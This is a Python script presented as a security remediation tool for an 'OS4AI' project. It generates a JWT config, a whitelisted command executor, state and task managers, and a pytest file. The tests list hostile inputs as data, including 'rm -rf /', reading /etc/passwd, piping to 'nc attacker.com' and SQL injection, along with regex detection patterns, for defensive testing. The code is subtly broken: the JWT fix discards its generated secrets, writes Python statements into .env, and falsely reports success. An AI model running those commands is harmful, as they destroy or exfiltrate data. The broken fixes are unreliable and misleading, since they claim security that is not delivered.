#!/usr/bin/env python3
"""
OS4AI Security Remediation Script
Fixes critical vulnerabilities identified in deep analysis
"""

import os
import secrets
import asyncio
import shutil
from pathlib import Path
from datetime import datetime
import json
import re

class OS4AISecurityRemediation:
    """Automated security fix implementation"""
    
    def __init__(self):
        self.backup_dir = f"security_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.fixes_applied = []
        self.env_file = Path(".env")
        
    def backup_files(self, files: list):
        """Backup files before modification"""
        print(f"📁 Creating backup directory: {self.backup_dir}")
        os.makedirs(self.backup_dir, exist_ok=True)
        
        for file_path in files:
            if Path(file_path).exists():
                backup_path = Path(self.backup_dir) / Path(file_path).name
                shutil.copy2(file_path, backup_path)
                print(f"  ✓ Backed up {file_path}")
    
    def fix_jwt_security(self):
        """Fix JWT security vulnerabilities"""
        print("\n🔐 Fixing JWT Security...")
        
        # Generate secure JWT secret
        jwt_secret = secrets.token_urlsafe(64)  # 512 bits
        jwt_refresh_secret = secrets.token_urlsafe(64)
        
        # Update .env file
        env_content = []
        jwt_found = False
        
        if self.env_file.exists():
            with open(self.env_file, 'r') as f:
                for line in f:
                    if line.startswith('jwt_secret = os.getenv("JWT_SECRET_KEY")'):
                        jwt_found = True
                    elif line.startswith('JWT_REFRESH_SECRET='):
                        env_content.append(f'JWT_REFRESH_SECRET = os.getenv("SECRET_SECRET", "")\n')
                    else:
                        env_content.append(line)
        
        if not jwt_found:
            env_content.append(f'\n# Security-hardened JWT secrets (generated {datetime.now()})\n')
            env_content.append(f'jwt_secret = os.getenv("JWT_SECRET_KEY")\n')
            env_content.append(f'JWT_REFRESH_SECRET = os.getenv("SECRET_SECRET", "")\n')
        
        with open(self.env_file, 'w') as f:
            f.writelines(env_content)
        
        print(f"  ✓ Generated secure JWT secrets (512 bits)")
        
        # Update token rotation config
        token_rotation_fix = '''
import os
import secrets
from typing import Optional

class SecureTokenRotationConfig:
    """Secure JWT configuration with validation"""
    
    def __init__(self):
        # Load from environment with secure fallback
        self.jwt_secret = os.getenv('JWT_SECRET')
        self.jwt_refresh_secret = os.getenv('JWT_REFRESH_SECRET')
        
        # Validate secrets
        if not self.jwt_secret or len(self.jwt_secret) < 32:
            # Generate secure secret if missing or weak
            self.jwt_secret = secrets.token_urlsafe(64)
            print("WARNING: Generated new JWT secret - update .env file")
        
        if not self.jwt_refresh_secret or len(self.jwt_refresh_secret) < 32:
            self.jwt_refresh_secret = secrets.token_urlsafe(64)
            print("WARNING: Generated new refresh secret - update .env file")
        
        # Security parameters
        self.access_token_expire_minutes = 15  # Short-lived
        self.refresh_token_expire_days = 7
        self.algorithm = "HS256"
        self.token_rotation_enabled = True
        self.max_refresh_count = 3  # Limit refresh chains
    
    def validate_secret_strength(self, secret: str) -> bool:
        """Validate secret meets security requirements"""
        if len(secret) < 32:
            return False
        
        # Check entropy
        unique_chars = len(set(secret))
        if unique_chars < 16:  # Low entropy
            return False
        
        return True
'''
        
        # Write secure config
        with open('app/core/secure_token_config.py', 'w') as f:
            f.write(token_rotation_fix)
        
        self.fixes_applied.append("JWT_SECURITY")
        print("  ✓ Created secure token configuration")
    
    def fix_command_injection(self):
        """Fix command injection vulnerabilities"""
        print("\n🛡️ Fixing Command Injection...")
        
        secure_command_executor = '''
"""
Secure Command Executor
Prevents command injection with whitelist approach
"""

import asyncio
import shlex
from typing import Dict, List, Optional, Any
from enum import Enum

class AllowedCommand(Enum):
    """Whitelisted commands"""
    STATUS = "status"
    HEALTH = "health"
    METRICS = "metrics"
    VERSION = "version"

class SecureCommandExecutor:
    """Execute only whitelisted commands safely"""
    
    # Strict command whitelist
    COMMAND_WHITELIST: Dict[AllowedCommand, List[str]] = {
        AllowedCommand.STATUS: ["python", "-m", "os4ai", "status"],
        AllowedCommand.HEALTH: ["python", "-m", "os4ai", "health"],
        AllowedCommand.METRICS: ["python", "-m", "os4ai", "metrics"],
        AllowedCommand.VERSION: ["python", "-m", "os4ai", "--version"]
    }
    
    def __init__(self):
        self.execution_log = []
    
    async def execute_safe(self, command_key: str) -> Dict[str, Any]:
        """Execute whitelisted command safely"""
        try:
            # Validate command exists
            try:
                command_enum = AllowedCommand(command_key)
            except ValueError:
                return {
                    "success": False,
                    "error": f"Command '{command_key}' not allowed",
                    "allowed_commands": [cmd.value for cmd in AllowedCommand]
                }
            
            # Get command array (no string interpolation!)
            cmd_array = self.COMMAND_WHITELIST[command_enum]
            
            # Log execution attempt
            self.execution_log.append({
                "timestamp": asyncio.get_event_loop().time(),
                "command": command_key,
                "status": "executing"
            })
            
            # Execute with NO shell
            process = await asyncio.create_subprocess_exec(
                *cmd_array,  # Unpack array - no shell interpretation
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                # Security restrictions
                env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"},
                cwd="/app",  # Restrict working directory
            )
            
            # Get output with timeout
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=10.0  # 10 second timeout
                )
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return {
                    "success": False,
                    "error": "Command execution timeout"
                }
            
            return {
                "success": process.returncode == 0,
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace'),
                "return_code": process.returncode
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Execution failed: {str(e)}"
            }
    
    def validate_no_injection(self, user_input: str) -> bool:
        """Validate input contains no injection attempts"""
        # Dangerous patterns
        dangerous_patterns = [
            r'[;&|`$]',  # Shell metacharacters
            r'\.\.',     # Path traversal
            r'\\x',      # Hex escapes
            r'\\[0-7]',  # Octal escapes
            r'eval|exec|import|open|file|input|raw_input|compile',  # Dangerous Python
            r'os\.|subprocess\.|sys\.|__',  # Module access
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                return False
        
        return True

# Global instance
secure_executor = SecureCommandExecutor()
'''
        
        with open('app/core/secure_command_executor.py', 'w') as f:
            f.write(secure_command_executor)
        
        self.fixes_applied.append("COMMAND_INJECTION")
        print("  ✓ Created secure command executor")
    
    def fix_state_machine(self):
        """Fix state machine race conditions"""
        print("\n🔄 Fixing State Machine...")
        
        thread_safe_state = '''
"""
Thread-Safe State Machine
Prevents race conditions and invalid transitions
"""

import asyncio
from enum import Enum
from typing import Dict, List, Optional, Set
from datetime import datetime, timezone
import logging

logger = logging.getLogger(__name__)

class SystemState(Enum):
    """System states with clear semantics"""
    IDLE = "idle"
    INITIALIZING = "initializing"
    READY = "ready"
    PROCESSING = "processing"
    ERROR = "error"
    SHUTDOWN = "shutdown"

class ThreadSafeStateManager:
    """Thread-safe state management with transition validation"""
    
    # Define valid state transitions
    VALID_TRANSITIONS: Dict[SystemState, Set[SystemState]] = {
        SystemState.IDLE: {SystemState.INITIALIZING, SystemState.SHUTDOWN},
        SystemState.INITIALIZING: {SystemState.READY, SystemState.ERROR},
        SystemState.READY: {SystemState.PROCESSING, SystemState.IDLE, SystemState.ERROR},
        SystemState.PROCESSING: {SystemState.READY, SystemState.ERROR},
        SystemState.ERROR: {SystemState.INITIALIZING, SystemState.SHUTDOWN},
        SystemState.SHUTDOWN: set()  # Terminal state
    }
    
    def __init__(self):
        self._state = SystemState.IDLE
        self._lock = asyncio.Lock()
        self._transition_history = []
        self._state_listeners = []
    
    async def get_state(self) -> SystemState:
        """Get current state (thread-safe)"""
        async with self._lock:
            return self._state
    
    async def transition(self, new_state: SystemState) -> bool:
        """Attempt state transition with validation"""
        async with self._lock:
            # Validate transition
            if new_state not in self.VALID_TRANSITIONS[self._state]:
                logger.error(
                    f"Invalid transition attempted: {self._state.value} → {new_state.value}"
                )
                return False
            
            # Record transition
            old_state = self._state
            self._state = new_state
            
            transition_record = {
                "from": old_state.value,
                "to": new_state.value,
                "timestamp": datetime.now(timezone.utc),
                "thread_id": asyncio.current_task().get_name()
            }
            
            self._transition_history.append(transition_record)
            
            # Log transition
            logger.info(
                f"State transition: {old_state.value} → {new_state.value} "
                f"(Task: {transition_record['thread_id']})"
            )
            
            # Notify listeners
            for listener in self._state_listeners:
                asyncio.create_task(listener(old_state, new_state))
            
            return True
    
    async def force_shutdown(self):
        """Force system to shutdown state (emergency)"""
        async with self._lock:
            logger.warning(f"Forcing shutdown from {self._state.value}")
            self._state = SystemState.SHUTDOWN
    
    def add_listener(self, callback):
        """Add state change listener"""
        self._state_listeners.append(callback)
    
    def get_transition_history(self, limit: int = 100) -> List[Dict]:
        """Get recent transition history"""
        return self._transition_history[-limit:]
    
    def is_operational(self) -> bool:
        """Check if system is in operational state"""
        return self._state in {SystemState.READY, SystemState.PROCESSING}

# Global instance
state_manager = ThreadSafeStateManager()
'''
        
        with open('app/core/thread_safe_state.py', 'w') as f:
            f.write(thread_safe_state)
        
        self.fixes_applied.append("STATE_MACHINE")
        print("  ✓ Created thread-safe state manager")
    
    def fix_memory_leaks(self):
        """Fix memory leak issues"""
        print("\n💾 Fixing Memory Leaks...")
        
        memory_safe_tasks = '''
"""
Memory-Safe Background Task Manager
Prevents memory leaks with proper cleanup
"""

import asyncio
import weakref
import gc
from typing import Dict, Set, Optional, Any
from datetime import datetime, timezone
import psutil
import logging

logger = logging.getLogger(__name__)

class MemorySafeTaskManager:
    """Background task manager with memory leak prevention"""
    
    def __init__(self, max_tasks: int = 10, memory_limit_mb: int = 512):
        self.max_tasks = max_tasks
        self.memory_limit_mb = memory_limit_mb
        self._tasks: Dict[str, asyncio.Task] = {}
        self._task_refs: weakref.WeakValueDictionary = weakref.WeakValueDictionary()
        self._shutdown = False
        self._cleanup_task: Optional[asyncio.Task] = None
    
    async def start(self):
        """Start task manager with cleanup monitoring"""
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("Memory-safe task manager started")
    
    async def stop(self):
        """Stop all tasks and cleanup"""
        self._shutdown = True
        
        # Cancel all tasks
        for task_id, task in list(self._tasks.items()):
            if not task.done():
                task.cancel()
        
        # Wait for cleanup
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        
        # Force garbage collection
        self._tasks.clear()
        self._task_refs.clear()
        gc.collect()
        
        logger.info("Memory-safe task manager stopped")
    
    async def create_task(
        self,
        task_id: str,
        coro,
        cleanup_callback=None
    ) -> Optional[asyncio.Task]:
        """Create managed task with cleanup"""
        
        # Check task limit
        if len(self._tasks) >= self.max_tasks:
            logger.warning(f"Task limit reached ({self.max_tasks})")
            return None
        
        # Check memory usage
        if not self._check_memory():
            logger.warning("Memory limit exceeded, refusing new task")
            return None
        
        # Cancel existing task with same ID
        if task_id in self._tasks:
            self._tasks[task_id].cancel()
        
        # Create wrapper with cleanup
        async def task_wrapper():
            try:
                result = await coro
                return result
            except asyncio.CancelledError:
                logger.debug(f"Task {task_id} cancelled")
                raise
            except Exception as e:
                logger.error(f"Task {task_id} error: {e}")
                raise
            finally:
                # Cleanup
                self._tasks.pop(task_id, None)
                if cleanup_callback:
                    try:
                        await cleanup_callback()
                    except Exception as e:
                        logger.error(f"Cleanup error for {task_id}: {e}")
        
        # Create and track task
        task = asyncio.create_task(task_wrapper())
        self._tasks[task_id] = task
        self._task_refs[task_id] = task
        
        return task
    
    async def _cleanup_loop(self):
        """Periodic cleanup of completed tasks"""
        while not self._shutdown:
            try:
                # Remove completed tasks
                completed = [
                    task_id for task_id, task in self._tasks.items()
                    if task.done()
                ]
                
                for task_id in completed:
                    self._tasks.pop(task_id, None)
                
                # Check memory usage
                if not self._check_memory():
                    logger.warning("Memory pressure detected, forcing cleanup")
                    gc.collect()
                
                # Log statistics
                if len(self._tasks) > 0:
                    memory_info = psutil.Process().memory_info()
                    logger.debug(
                        f"Active tasks: {len(self._tasks)}, "
                        f"Memory: {memory_info.rss / 1024 / 1024:.1f}MB"
                    )
                
                await asyncio.sleep(30)  # Check every 30 seconds
                
            except Exception as e:
                logger.error(f"Cleanup loop error: {e}")
                await asyncio.sleep(60)
    
    def _check_memory(self) -> bool:
        """Check if memory usage is within limits"""
        try:
            memory_info = psutil.Process().memory_info()
            memory_mb = memory_info.rss / 1024 / 1024
            return memory_mb < self.memory_limit_mb
        except Exception:
            return True  # Assume OK if can't check
    
    def get_stats(self) -> Dict[str, Any]:
        """Get task manager statistics"""
        memory_info = psutil.Process().memory_info()
        
        return {
            "active_tasks": len(self._tasks),
            "max_tasks": self.max_tasks,
            "memory_mb": memory_info.rss / 1024 / 1024,
            "memory_limit_mb": self.memory_limit_mb,
            "task_ids": list(self._tasks.keys())
        }

# Global instance
memory_safe_tasks = MemorySafeTaskManager()
'''
        
        with open('app/core/memory_safe_tasks.py', 'w') as f:
            f.write(memory_safe_tasks)
        
        self.fixes_applied.append("MEMORY_LEAKS")
        print("  ✓ Created memory-safe task manager")
    
    def create_security_test(self):
        """Create security validation test"""
        print("\n🧪 Creating Security Tests...")
        
        security_tests = '''
"""
OS4AI Security Validation Tests
Verify security fixes are properly implemented
"""

import pytest
import asyncio
import jwt
import os
from datetime import datetime, timedelta

from app.core.secure_token_config import SecureTokenRotationConfig
from app.core.secure_command_executor import SecureCommandExecutor, AllowedCommand
from app.core.thread_safe_state import ThreadSafeStateManager, SystemState
from app.core.memory_safe_tasks import MemorySafeTaskManager

class TestSecurityFixes:
    """Test security remediation effectiveness"""
    
    def test_jwt_security(self):
        """Test JWT security improvements"""
        config = SecureTokenRotationConfig()
        
        # Test secret strength
        assert len(config.jwt_secret) >= 32
        assert len(config.jwt_refresh_secret) >= 32
        assert config.validate_secret_strength(config.jwt_secret)
        
        # Test token expiration
        assert config.access_token_expire_minutes <= 60
        assert config.refresh_token_expire_days <= 30
        
        # Test no hardcoded secrets
        weak_secrets = ["secret", "password", "12345", "admin", ""]
        assert config.jwt_secret not in weak_secrets
    
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test command injection prevention"""
        executor = SecureCommandExecutor()
        
        # Test whitelisted command works
        result = await executor.execute_safe("status")
        assert "error" not in result or not result["success"]
        
        # Test injection attempts fail
        dangerous_inputs = [
            "status; rm -rf /",
            "status && cat /etc/passwd",
            "status | nc attacker.com 1234",
            "../../../etc/passwd",
            "'; DROP TABLE users; --"
        ]
        
        for dangerous in dangerous_inputs:
            # Should reject at validation
            assert not executor.validate_no_injection(dangerous)
            
            # Should fail if attempted
            result = await executor.execute_safe(dangerous)
            assert not result["success"]
    
    @pytest.mark.asyncio
    async def test_state_machine_thread_safety(self):
        """Test state machine thread safety"""
        manager = ThreadSafeStateManager()
        
        # Test valid transitions
        assert await manager.transition(SystemState.INITIALIZING)
        assert await manager.transition(SystemState.READY)
        
        # Test invalid transition
        assert not await manager.transition(SystemState.SHUTDOWN)
        
        # Test concurrent access (no race condition)
        async def concurrent_transition():
            tasks = []
            for _ in range(10):
                tasks.append(manager.transition(SystemState.PROCESSING))
                tasks.append(manager.transition(SystemState.READY))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            # Should have no exceptions
            assert all(isinstance(r, bool) for r in results)
    
    @pytest.mark.asyncio
    async def test_memory_leak_prevention(self):
        """Test memory leak prevention"""
        task_manager = MemorySafeTaskManager(max_tasks=5, memory_limit_mb=256)
        await task_manager.start()
        
        # Create tasks
        async def dummy_task():
            await asyncio.sleep(0.1)
            return "done"
        
        # Test task limit enforcement
        tasks = []
        for i in range(10):
            task = await task_manager.create_task(f"task_{i}", dummy_task())
            if task:
                tasks.append(task)
        
        # Should only create max_tasks
        assert len(tasks) <= 5
        
        # Test cleanup
        await asyncio.sleep(0.2)  # Let tasks complete
        stats = task_manager.get_stats()
        
        # Completed tasks should be cleaned up
        assert stats["active_tasks"] == 0
        
        await task_manager.stop()

if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
'''
        
        with open('test_security_fixes.py', 'w') as f:
            f.write(security_tests)
        
        print("  ✓ Created security validation tests")
    
    def generate_report(self):
        """Generate remediation report"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "fixes_applied": self.fixes_applied,
            "backup_directory": self.backup_dir,
            "next_steps": [
                "Review generated secure implementations",
                "Run security validation tests",
                "Update existing code to use secure components",
                "Re-run full validation suite",
                "Deploy with monitoring enabled"
            ],
            "files_created": [
                "app/core/secure_token_config.py",
                "app/core/secure_command_executor.py", 
                "app/core/thread_safe_state.py",
                "app/core/memory_safe_tasks.py",
                "test_security_fixes.py"
            ]
        }
        
        with open('security_remediation_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\n📄 Remediation report: security_remediation_report.json")
    
    async def apply_fixes(self):
        """Apply all security fixes"""
        print("🔧 OS4AI Security Remediation Starting...")
        print("="*50)
        
        # Backup critical files
        files_to_backup = [
            ".env",
            "app/core/token_rotation.py",
            "app/core/os4ai_config.py",
            "app/core/background_tasks.py"
        ]
        self.backup_files(files_to_backup)
        
        # Apply fixes
        self.fix_jwt_security()
        self.fix_command_injection()
        self.fix_state_machine()
        self.fix_memory_leaks()
        self.create_security_test()
        
        # Generate report
        self.generate_report()
        
        print("\n✅ Security Remediation Complete!")
        print(f"✅ Fixes applied: {', '.join(self.fixes_applied)}")
        print("\n⚠️  IMPORTANT NEXT STEPS:")
        print("1. Review the generated secure implementations")
        print("2. Integrate them into the existing codebase")
        print("3. Run: pytest test_security_fixes.py")
        print("4. Re-run the full validation suite")
        print("5. Update deployment configuration")

async def main():
    remediation = OS4AISecurityRemediation()
    await remediation.apply_fixes()

if __name__ == "__main__":
    asyncio.run(main())